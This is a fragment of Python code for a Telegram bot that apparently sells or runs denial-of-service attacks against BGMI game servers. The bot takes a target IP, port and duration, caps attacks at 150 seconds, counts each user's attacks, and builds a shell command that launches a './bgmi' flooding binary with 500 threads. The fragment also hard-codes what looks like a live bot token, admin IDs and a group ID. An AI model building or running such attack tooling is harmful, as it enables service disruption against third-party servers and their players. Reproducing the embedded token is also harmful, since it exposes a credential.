...
bot_token = '7955245382:AAHS62duTTlDYlcIzIQ7AuwlDpj4rMt1rmE'
admin_id = '6437994839,1604629264'  # Replace with your actual admin user ID
GROUP_ID = '-1002447886308'  # Allowed group ID
...
def handle_bgmi(message):
    ...
    if int(attack_time) > 150:
        bot.reply_to(message, "𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗘𝗥𝗥𝗢𝗥 - 𝗧𝗥𝗬 150")
        return

    user_last_attack_time[user_id] = current_time
    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

    full_command = f"./bgmi {target} {port} {attack_time} 500"
